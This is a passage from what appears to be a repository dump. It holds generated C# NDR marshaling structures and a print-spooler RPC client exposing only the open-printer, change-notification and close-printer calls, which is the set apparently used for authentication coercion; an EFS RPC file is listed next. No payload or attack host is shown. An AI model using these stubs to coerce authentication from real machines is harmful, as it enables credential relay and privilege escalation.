System.Func<Struct_82>(u.Read_81), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_81\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_82> Arm_1;\n        public static Union_81 CreateDefault()\n        {\n            return new Union_81();\n        }\n        public Union_81(uint Selector, System.Nullable<Struct_82> Arm_1)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n        }\n    }\n    public struct Struct_82 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<Struct_83[], long>(Member8, new System.Action<Struct_83[], long>(m.Write_109), Member0);\n            m.WriteEmbeddedPointer<int[], long>(Member10, new System.Action<int[], long>(m.Write_110), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<Struct_83[]>(new System.Func<Struct_83[]>(u.Read_109), false);\n            Member10 = u.ReadEmbeddedPointer<int[]>(new System.Func<int[]>(u.Read_110), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_83[]> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<int[]> Member10;\n        public static Struct_82 CreateDefault()\n        {\n            return new Struct_82();\n        }\n        public Struct_82(int Member0, Struct_83[] Member8, int[] Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_83 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member10);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public int Member10;\n        public static Struct_83 CreateDefault()\n        {\n            return new Struct_83();\n        }\n        public Struct_83(int Member0, string Member8, int Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_84 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEnum16(Member0);\n            m.Write_84(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEnum16();\n            Member8 = u.Read_84();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEnum16 Member0;\n        public Union_85 Member8;\n        public static Struct_84 CreateDefault()\n        {\n            return new Struct_84();\n        }\n        public Struct_84(NtApiDotNet.Ndr.Marshal.NdrEnum16 Member0, Union_85 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_85 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((NtApiDotNet.Ndr.Marshal.NdrEnum16)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEnum16(Selector);\n            if ((Selector == 1))\n            {\n                m.Write_111(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(Arm_1, \"Arm_1\"));\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                m.WriteInt32(Arm_2);\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                m.WriteInt64(Arm_3);\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                m.WriteSByte(Arm_4);\n                goto done;\n            }\n            if ((Selector == 5))\n            {\n                m.Write_85(Arm_5);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_85\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadEnum16();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.Read_111();\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                Arm_2 = u.ReadInt32();\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                Arm_3 = u.ReadInt64();\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                Arm_4 = u.ReadSByte();\n                goto done;\n            }\n            if ((Selector == 5))\n            {\n                Arm_5 = u.Read_85();\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_85\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        private NtApiDotNet.Ndr.Marshal.NdrEnum16 Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrUnsupported Arm_1;\n        public int Arm_2;\n        public long Arm_3;\n        public sbyte Arm_4;\n        public Struct_86 Arm_5;\n        public static Union_85 CreateDefault()\n        {\n            return new Union_85();\n        }\n        public Union_85(NtApiDotNet.Ndr.Marshal.NdrEnum16 Selector, NtApiDotNet.Ndr.Marshal.NdrUnsupported Arm_1, int Arm_2, long Arm_3, sbyte Arm_4, Struct_86 Arm_5)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n            this.Arm_2 = Arm_2;\n            this.Arm_3 = Arm_3;\n            this.Arm_4 = Arm_4;\n            this.Arm_5 = Arm_5;\n        }\n    }\n    public struct Struct_86 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<sbyte[], long>(Member8, new System.Action<sbyte[], long>(m.Write_95), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<sbyte[]>(new System.Func<sbyte[]>(u.Read_95), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<sbyte[]> Member8;\n        public static Struct_86 CreateDefault()\n        {\n            return new Struct_86();\n        }\n        public Struct_86(int Member0, sbyte[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_87 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.Write_83(Member8);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.Read_83();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public Struct_84 Member8;\n        public static Struct_87 CreateDefault()\n        {\n            return new Struct_87();\n        }\n        public Struct_87(string Member0, Struct_84 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_88 : NtApiDotNet.Ndr.Marshal.INdrConformantStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_112(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(Member8, \"Member8\"), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_112();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrConformantStructure.GetConformantDimensions()\n        {\n            return 1;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public int Member0;\n        public Struct_89[] Member8;\n        public static Struct_88 CreateDefault()\n        {\n            Struct_88 ret = new Struct_88();\n            ret.Member8 = new Struct_89[0];\n            return ret;\n        }\n        public Struct_88(int Member0, Struct_89[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_89 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEnum16(Member0);\n            m.WriteInt32(Member4);\n            m.Write_89(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEnum16();\n            Member4 = u.ReadInt32();\n            Member8 = u.Read_89();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEnum16 Member0;\n        public int Member4;\n        public Union_90 Member8;\n        public static Struct_89 CreateDefault()\n        {\n            return new Struct_89();\n        }\n        public Struct_89(NtApiDotNet.Ndr.Marshal.NdrEnum16 Member0, int Member4, Union_90 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_90 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((NtApiDotNet.Ndr.Marshal.NdrEnum16)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEnum16(Selector);\n            if ((Selector == 1))\n            {\n                m.Write_90(Arm_1);\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                m.Write_91(Arm_2);\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                m.Write_92(Arm_3);\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                m.Write_93(Arm_4);\n                goto done;\n            }\n            if ((Selector == 5))\n            {\n                m.Write_94(Arm_5);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_90\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadEnum16();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.Read_90();\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                Arm_2 = u.Read_91();\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                Arm_3 = u.Read_92();\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                Arm_4 = u.Read_93();\n                goto done;\n            }\n            if ((Selector == 5))\n            {\n                Arm_5 = u.Read_94();\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_90\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        private NtApiDotNet.Ndr.Marshal.NdrEnum16 Selector;\n        public Struct_91 Arm_1;\n        public Struct_92 Arm_2;\n        public Struct_93 Arm_3;\n        public Struct_94 Arm_4;\n        public Struct_95 Arm_5;\n        public static Union_90 CreateDefault()\n        {\n            return new Union_90();\n        }\n        public Union_90(NtApiDotNet.Ndr.Marshal.NdrEnum16 Selector, Struct_91 Arm_1, Struct_92 Arm_2, Struct_93 Arm_3, Struct_94 Arm_4, Struct_95 Arm_5)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n            this.Arm_2 = Arm_2;\n            this.Arm_3 = Arm_3;\n            this.Arm_4 = Arm_4;\n            this.Arm_5 = Arm_5;\n        }\n    }\n    public struct Struct_91 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member28, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt64(Member30);\n            m.WriteInt32(Member38);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member30 = u.ReadInt64();\n            Member38 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member28;\n        public long Member30;\n        public int Member38;\n        public static Struct_91 CreateDefault()\n        {\n            return new Struct_91();\n        }\n        public Struct_91(int Member0, string Member8, string Member10, string Member18, string Member20, string Member28, long Member30, int Member38)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member38 = Member38;\n        }\n    }\n    public struct Struct_92 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt64(Member0);\n            m.WriteInt32(Member8);\n            m.WriteInt16(MemberC);\n            m.WriteInt16(MemberE);\n            m.WriteInt16(Member10);\n            m.WriteInt16(Member12);\n            m.WriteInt16(Member14);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt64();\n            Member8 = u.ReadInt32();\n            MemberC = u.ReadInt16();\n            MemberE = u.ReadInt16();\n            Member10 = u.ReadInt16();\n            Member12 = u.ReadInt16();\n            Member14 = u.ReadInt16();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public long Member0;\n        public int Member8;\n        public short MemberC;\n        public short MemberE;\n        public short Member10;\n        public short Member12;\n        public short Member14;\n        public static Struct_92 CreateDefault()\n        {\n            return new Struct_92();\n        }\n        public Struct_92(long Member0, int Member8, short MemberC, short MemberE, short Member10, short Member12, short Member14)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.MemberC = MemberC;\n            this.MemberE = MemberE;\n            this.Member10 = Member10;\n            this.Member12 = Member12;\n            this.Member14 = Member14;\n        }\n    }\n    public struct Struct_93 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt64(Member28);\n            m.WriteInt64(Member30);\n            m.WriteInt32(Member38);\n            m.WriteInt32(Member3C);\n            m.WriteEmbeddedPointer<string>(Member40, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member48, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member50, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.ReadInt64();\n            Member30 = u.ReadInt64();\n            Member38 = u.ReadInt32();\n            Member3C = u.ReadInt32();\n            Member40 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member48 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member50 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public long Member28;\n        public long Member30;\n        public int Member38;\n        public int Member3C;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member40;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member48;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member50;\n        public static Struct_93 CreateDefault()\n        {\n            return new Struct_93();\n        }\n        public Struct_93(int Member0, string Member8, string Member10, string Member18, string Member20, long Member28, long Member30, int Member38, int Member3C, string Member40, string Member48, string Member50)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member38 = Member38;\n            this.Member3C = Member3C;\n            this.Member40 = Member40;\n            this.Member48 = Member48;\n            this.Member50 = Member50;\n        }\n    }\n    public struct Struct_94 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public static Struct_94 CreateDefault()\n        {\n            return new Struct_94();\n        }\n        public Struct_94(string Member0, string Member8, string Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_95 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public static Struct_95 CreateDefault()\n        {\n            return new Struct_95();\n        }\n        public Struct_95(string Member0)\n        {\n            this.Member0 = Member0;\n        }\n    }\n    #endregion\n    #region Client Implementation\n    public sealed class Client : NtApiDotNet.Win32.Rpc.RpcClientBase\n    {\n        public Client() : \n                base(\"12345678-1234-abcd-ef00-0123456789ab\", 1, 0)\n        {\n        }\n        private _Unmarshal_Helper SendReceive(int p, _Marshal_Helper m)\n        {\n            return new _Unmarshal_Helper(SendReceive(p, m.DataRepresentation, m.ToArray(), m.Handles));\n        }\n\n        // async\n        public int RpcOpenPrinter(string p0, out NtApiDotNet.Ndr.Marshal.NdrContextHandle p1, string p2, Struct_0 p3, int p4)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p2, new System.Action<string>(m.WriteTerminatedString));\n            m.Write_0(p3);\n            m.WriteInt32(p4);\n            _Unmarshal_Helper u = SendReceive(1, m);\n            p1 = u.ReadContextHandle();\n            return u.ReadInt32();\n        }\n\n        public int RpcRemoteFindFirstPrinterChangeNotificationEx(NtApiDotNet.Ndr.Marshal.NdrContextHandle p0, int p1, int p2, string p3, int p4, System.Nullable<Struct_44> p5) {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteContextHandle(p0);\n            m.WriteInt32(p1);\n            m.WriteInt32(p2);\n            m.WriteReferent(p3, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(p4);\n            m.WriteReferent(p5, new System.Action<Struct_44>(m.Write_44));\n            _Unmarshal_Helper u = SendReceive(65, m);\n            return u.ReadInt32();\n        }\n        \n        public int RpcClosePrinter(ref NtApiDotNet.Ndr.Marshal.NdrContextHandle p0) {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteContextHandle(p0);\n            _Unmarshal_Helper u = SendReceive(29, m);\n            p0 = u.ReadContextHandle();\n            return u.ReadInt32();\n        }\n    }\n    #endregion\n}\n\n"
        },
        {
          "name": "Com",
          "type": "tree",
          "content": null
        },
        {
          "name": "EfsRpc.cs",
          "type": "blob",
          "size": 3.626953125,
